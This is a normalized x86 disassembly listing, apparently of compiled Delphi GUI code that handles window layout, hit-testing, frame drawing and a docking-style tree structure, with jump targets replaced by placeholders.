call sub_446b80
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edi [ eax ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x4 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x12
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_446ba8
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_446b80
call sub_447328
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
add edi [ edx + 0x18 ]
cmp eax edi
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
add esi [ edx + 0x18 ]
cmp eax esi
jg r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_446ba8
call sub_447328
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x4 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edi [ eax ]
jg r-xdata
mov edx 0x1
mov eax ebx
call sub_4466e0
add esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x4 ]
jl r-xdata
mov edx 0x2
mov eax ebx
call sub_4466e0
add edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edi [ eax ]
jl r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ ebx + 0x4 ]
mov edx [ edx + 0x44 ]
add edx 0xf
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
mov eax [ ebx + 0x4 ]
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
sub edx 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edx [ eax ]
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x14
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x2
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x14
jmp r-xdata
sub_447554
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x14 ]
call sub_441428
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx esi
call sub_4413ec
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033f8
test al al
je r-xdata
mov edx [ edi + 0x4 ]
sub edx [ ebx + 0x44 ]
mov eax [ edi ]
sub eax [ ebx + 0x40 ]
lea ecx [ ebp - 0x8 ]
call sub_41256c
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
lea edx [ ebp - 0x18 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x18 ]
push eax
call PtInRect
test eax eax
jne r-xdata
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4475e8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax ] edx
push ebp
mov eax [ ebp - 0x4 ]
call sub_447554
pop ecx
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
call sub_446ba8
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
cmp eax [ ebx + 0xa0 ]
jne r-xdata
mov eax [ ebp - 0x10 ]
pop ebx
mov esp ebp
pop ebp
retn
test ebx ebx
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_446df4
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
call sub_446ba8
call sub_447328
pop ecx
mov eax [ ebp - 0xc ]
mov [ eax ] 0x1
jmp r-xdata
sub_447670
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_403fbc
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0xc ]
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_404608
mov edx [ ebx ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
sub_4476b8
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4478b0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x64 ]
mov eax [ ebp - 0x8 ]
call sub_447d88
mov eax [ ebp - 0x8 ]
call sub_446d84
xor edx edx
push ebp
push sub_447893
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0x1c ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edi [ ebp - 0x20 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x68 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
xor eax eax
mov [ ebp - 0x18 ] eax
xor esi esi
inc edi
mov [ ebp - 0x1c ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44789a
mov eax [ ebp - 0x8 ]
call sub_446d88
retn
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_44655c
mov ebx eax
lea edx [ ebx + 0x10 ]
mov ecx 0x1
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
lea edx [ ebx + 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
push ebp
lea eax [ ebp - 0xc ]
call sub_447670
pop ecx
cmp [ ebp - 0xc ] 0x0
je r-xdata
inc [ ebp - 0x1c ]
dec edi
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0xc ]
mov si 0xffb9
call sub_403468
cmp [ ebp - 0x10 ] 0x0
je r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_44687c
test al al
jne r-xdata
push ebp
lea eax [ ebp - 0xc ]
call sub_447670
pop ecx
cmp [ ebp - 0xc ] 0x0
je r-xdata
xor edx edx
mov eax [ ebp - 0x10 ]
call sub_43dde4
push 0x0
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x14 ]
xor ecx ecx
mov eax [ ebp - 0x10 ]
call sub_43ec10
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0x64 ] ebx
jmp r-xdata
mov eax ebx
call sub_40326c
jmp r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jle r-xdata
mov [ esi + 0xc ] ebx
mov [ ebx + 0x18 ] esi
mov eax [ esi + 0x14 ]
mov [ ebx + 0x14 ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x18 ] eax
mov esi ebx
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x14 ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jge r-xdata
mov [ esi + 0x8 ] ebx
mov [ ebx + 0x14 ] esi
jmp r-xdata
mov eax esi
mov edi [ ebp - 0x18 ]
sub edi [ ebp - 0x14 ]
test edi edi
jle r-xdata
mov [ eax + 0xc ] ebx
mov [ ebx + 0x18 ] eax
mov eax [ eax + 0x14 ]
mov [ ebx + 0x14 ] eax
mov [ ebp - 0x1c ] 0x1
mov eax [ eax + 0x14 ]
inc [ ebp - 0x1c ]
dec edi
jne r-xdata
sub_4478c0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edi [ eax + 0x18 ]
mov eax edi
add eax esi
sub eax 0x2
push eax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx edi
add ecx ebx
sub ecx 0x2
mov edx esi
mov eax ebx
call sub_412594
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41d628
push eax
call DrawFrameControl
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_447918
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx 0xff000014
call sub_41cb80
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx ebx
mov edx esi
call sub_41d2dc
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx ebx
mov edx edi
call sub_41d27c
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov edx edi
call sub_41d27c
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx 0xff000010
call sub_41cb80
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov edx esi
call sub_41d27c
mov ecx ebx
dec ecx
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_41d27c
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_4479a0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov ebx [ ebp + 0x8 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov al [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
push ebp
mov eax [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
sub eax [ edx + 0x18 ]
inc eax
mov edx [ ebx + 0x4 ]
inc edx
call sub_4478c0
pop ecx
push ebp
mov eax [ ebx + 0x4 ]
mov edx eax
add edx 0x5
push edx
mov ecx [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
sub ecx [ edx + 0x18 ]
sub ecx 0x2
mov edx eax
add edx 0x3
mov eax [ ebx ]
add eax 0x2
call sub_447918
pop ecx
push ebp
mov eax [ ebx + 0x4 ]
mov edx eax
add edx 0x8
push edx
mov ecx [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
sub ecx [ edx + 0x18 ]
sub ecx 0x2
mov edx eax
add edx 0x6
mov eax [ ebx ]
add eax 0x2
call sub_447918
pop ecx
push ebp
mov edx [ ebx + 0x4 ]
inc edx
mov eax [ ebx ]
inc eax
call sub_4478c0
pop ecx
push ebp
mov edx [ ebx + 0xc ]
sub edx 0x2
push edx
mov edx [ ebx + 0x4 ]
mov ecx [ ebp - 0x8 ]
add edx [ ecx + 0x18 ]
inc edx
mov eax [ ebx ]
mov ecx eax
add ecx 0x5
add eax 0x3
call sub_447918
pop ecx
push ebp
mov edx [ ebx + 0xc ]
sub edx 0x2
push edx
mov edx [ ebx + 0x4 ]
mov ecx [ ebp - 0x8 ]
add edx [ ecx + 0x18 ]
inc edx
mov eax [ ebx ]
mov ecx eax
add ecx 0x8
add eax 0x6
call sub_447918
pop ecx
jmp r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_447a7c
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41cfb0
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_447bd2
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ esi + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_43caa0
mov eax [ ebp - 0x4 ]
call sub_41d2b4
xor eax eax
push ebp
push sub_447bb5
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41d6a8
xor eax eax
push ebp
push sub_447b98
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x14 ]
call sub_441428
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447b9f
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_41d6a8
retn
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec [ ebp - 0xc ]
jne r-xdata
mov eax [ ebx + 0xa0 ]
cmp eax [ esi + 0x14 ]
jne r-xdata
mov eax [ esi + 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_4413ec
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_43d864
lea ecx [ ebp - 0x1c ]
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi ]
mov eax [ ebp - 0x1c ]
sub eax [ ebx + 0x40 ]
add eax eax
sub [ ebp - 0x1c ] eax
mov eax [ ebp - 0x18 ]
sub eax [ ebx + 0x44 ]
add eax eax
sub [ ebp - 0x18 ] eax
mov eax [ ebx + 0x48 ]
mov edx [ ebp - 0x14 ]
sub edx [ ebp - 0x1c ]
sub eax edx
add eax eax
sub [ ebp - 0x14 ] eax
mov eax [ ebx + 0x4c ]
mov edx [ ebp - 0x10 ]
sub edx [ ebp - 0x18 ]
sub eax edx
add eax eax
sub [ ebp - 0x10 ] eax
lea eax [ ebp - 0x1c ]
push eax
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x10 ]
sub_447be0
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov ebx ecx
mov esi eax
mov eax [ esi + 0x14 ]
call sub_443228
mov edi eax
test ebx ebx
je r-xdata
mov eax [ esi + 0x14 ]
call sub_43d90c
push eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ esi + 0x14 ]
call sub_43d8c8
mov ecx eax
xor edx edx
xor eax eax
call sub_412594
mov eax [ ebp + 0x8 ]
push esi
push edi
lea esi [ ebp - 0x1c ]
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
test edi edi
jle r-xdata
cmp [ ebx + 0x9c ] 0x0
je r-xdata
push 0x2
mov eax [ ebp + 0x8 ]
push eax
push 0x0
mov eax [ esi + 0x14 ]
call sub_4446f8
push eax
call MapWindowPoints
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov al [ ebp + 0xc ]
dec al
je r-xdata
cmp edi 0x2
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
mov eax [ ebx + 0x40 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x44 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x48 ]
mov edi eax
mov edx [ ebx + 0x4c ]
mov [ ebp - 0xc ] edx
mov dl [ ebp + 0xc ]
add dl 0xfd
sub dl 0x2
jae r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
mov al [ ebp + 0xc ]
dec eax
sub al 0x2
jae r-xdata
mov edi eax
sar edi 0x1
jns r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
mov al [ ebp + 0xc ]
sub al 0x2
je r-xdata
mov eax [ ebx + 0x4c ]
sar eax 0x1
jns r-xdata
adc edi 0x0
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
sar eax 0x1
jns r-xdata
jmp r-xdata
mov eax [ ebp - 0xc ]
add [ ebp - 0x8 ] eax
sub al 0x2
jne r-xdata
mov [ ebp - 0xc ] eax
adc eax 0x0
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x1c ]
push eax
mov ecx edi
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4125bc
mov eax [ ebp + 0x8 ]
push esi
lea esi [ ebp - 0x1c ]
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
add [ ebp - 0x4 ] edi
jmp r-xdata
sub_447d54
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_447d54
pop ecx
mov eax ebx
call sub_40326c
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_447d54
pop ecx
sub_447d88
push ebp
mov ebp esp
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
je r-xdata
push ebp
call sub_447d54
pop ecx
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
mov edx [ ebx + 0xc ]
mov [ eax + 0xc ] edx
jmp r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov edx [ ebx + 0xc ]
mov [ eax + 0x8 ] edx
cmp ebx [ esi + 0x64 ]
jne r-xdata
mov edx [ ebx + 0x18 ]
mov [ eax + 0x18 ] edx
mov eax ebx
call sub_40326c
xor eax eax
mov [ esi + 0x64 ] eax
sub_447de4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_446df4
test eax eax
je r-xdata
pop esi
pop ebx
retn
cmp eax [ ebx + 0x38 ]
jne r-xdata
mov edx eax
mov eax ebx
call sub_447e20
xor edx edx
mov [ eax + 0x4 ] edx
jmp r-xdata
mov [ esi + 0x9c ] 0x0
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
sub_447e20
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_44808d
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jne r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405aec
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405aec
mov edx [ ebp - 0x8 ]
pop eax
call sub_404284
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b414
call sub_4039f8
mov eax [ ebx + 0x14 ]
call sub_446580
cmp eax 0x1
jne r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405aec
lea eax [ ebp - 0xc ]
push eax
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405aec
mov edx [ ebp - 0x10 ]
pop eax
call sub_404284
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b414
call sub_4039f8
cmp eax 0x2
jne r-xdata
mov eax [ esi + 0x64 ]
xor edx edx
mov [ eax + 0x8 ] edx
mov [ eax + 0x10 ] 0x0
jmp r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
jne r-xdata
mov eax ebx
call sub_40326c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_448094
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403fe0
retn
mov edx [ ebx + 0xc ]
mov [ eax + 0xc ] edx
mov edx [ ebx + 0xc ]
test edx edx
je r-xdata
mov eax [ ebx + 0x14 ]
mov edx [ ebx + 0xc ]
mov [ eax + 0x8 ] edx
mov eax [ ebx + 0xc ]
xor edx edx
mov [ eax + 0x18 ] edx
call sub_446930
jmp r-xdata
mov edi eax
mov edi [ ebx + 0xc ]
jmp r-xdata
mov eax ebx
call sub_446aa8
mov edx eax
mov eax [ ebx + 0x18 ]
call sub_446ae4
mov eax [ ebx + 0x18 ]
call sub_446930
mov [ edx + 0x18 ] eax
push esi
push sub_448630
mov edx [ ebx + 0x14 ]
mov eax esi
call sub_446e5c
mov eax [ ebx + 0x14 ]
cmp eax [ esi + 0x64 ]
jne r-xdata
mov edx [ esi + 0x64 ]
mov eax [ ebx + 0x14 ]
cmp edx eax
jne r-xdata
cmp [ edi + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x14 ]
mov eax [ eax + 0x18 ]
mov edx [ edi + 0x8 ]
mov [ edx + 0x18 ] eax
test eax eax
jne r-xdata
mov edx [ esi + 0x68 ]
mov eax edi
call sub_446ae4
mov eax [ esi + 0x64 ]
call sub_446aa8
mov [ esi + 0x68 ] eax
mov eax [ esi + 0x64 ]
call sub_40326c
mov [ esi + 0x64 ] edi
xor eax eax
mov [ edi + 0xc ] eax
xor eax eax
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0x14 ] eax
mov eax esi
call sub_448608
jmp r-xdata
mov [ eax + 0x10 ] 0x0
mov edx [ edi + 0x4 ]
mov [ eax + 0x4 ] edx
xor edx edx
mov [ eax + 0x8 ] edx
mov eax edi
call sub_40326c
mov eax [ esi + 0x64 ]
mov [ eax + 0x8 ] edi
xor eax eax
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0xc ] eax
mov eax [ esi + 0x64 ]
call sub_44662c
mov edx eax
mov eax edi
call sub_446ad0
mov eax edi
call sub_446930
jmp r-xdata
mov edx [ edi + 0x8 ]
mov [ eax + 0xc ] edx
mov eax [ edi + 0x8 ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
push esi
push sub_448630
mov edx [ ebx + 0x14 ]
mov eax esi
call sub_446e5c
jmp r-xdata
mov eax [ eax + 0xc ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ eax + 0x14 ] edx
cmp [ eax + 0xc ] 0x0
jne r-xdata
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0xc ]
mov [ eax + 0xc ] edx
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax [ edi + 0x8 ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ eax + 0x14 ] edx
push esi
push sub_448630
mov edx [ eax + 0x14 ]
mov eax esi
call sub_446e5c
mov eax [ ebx + 0x14 ]
call sub_40326c
mov eax edi
call sub_40326c
jmp r-xdata
mov edx [ eax + 0xc ]
mov [ edx + 0x18 ] eax
sub_44809c
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov edi eax
mov esi [ edi + 0x14 ]
test [ esi + 0x1c ] 0x1
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x64 ] 0x0
je r-xdata
mov eax esi
call sub_443228
test eax eax
jle r-xdata
mov edx esp
mov eax [ edi + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ edi + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
test bl bl
jne r-xdata
push edi
lea esi [ esp + 0x4 ]
add edi 0x1d
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov eax [ edi + 0x64 ]
mov dl [ eax + 0x10 ]
dec dl
je r-xdata
lea edx [ edi + 0x1d ]
mov eax esp
mov ecx 0x10
call sub_407bf4
test al al
jne r-xdata
mov edx [ esp + 0x8 ]
sub edx [ esp ]
call sub_446ad0
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
mov [ edi + 0x68 ] eax
jmp r-xdata
dec dl
je r-xdata
mov eax [ edi + 0x14 ]
call sub_443194
test eax eax
jle r-xdata
mov edx [ esp + 0xc ]
sub edx [ esp + 0x4 ]
call sub_446ad0
mov eax [ esp + 0x8 ]
sub eax [ esp ]
mov [ edi + 0x68 ] eax
jmp r-xdata
xor edx edx
mov eax edi
call sub_4484b8
cmp [ edi + 0x6c ] 0x0
jne r-xdata
push edi
push sub_448630
xor edx edx
mov eax edi
call sub_446e5c
sub_448178
push ebx
push esi
push ecx
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop edx
pop esi
pop ebx
retn
test ebx ebx
je r-xdata
mov eax [ ebx + 0x14 ]
mov al [ eax + 0x10 ]
cmp al [ esi + 0x48 ]
jne r-xdata
mov eax ebx
call sub_446aa8
mov [ esp ] eax
fild [ esp ]
fmul [ esi + 0x40 ]
call sub_402a68
mov edx eax
mov eax ebx
call sub_446ad0
sub_4481b4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_40446c
xor eax eax
push ebp
push sub_44821f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40427c
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp [ ebp - 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_448226
lea eax [ ebp - 0x4 ]
call sub_403fbc
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
sub_44822c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_4482db
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0x10 ]
lea edx [ ebx + 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x1
mov esi [ eax ]
call [ esi + 0x10 ]
lea edx [ ebx + 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0x10 ]
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_446838
mov eax [ ebp - 0x8 ]
call sub_4481b4
pop ecx
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
mov edx [ ebp - 0x4 ]
inc edx
call sub_44822c
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4482e2
lea eax [ ebp - 0x8 ]
call sub_403fbc
retn
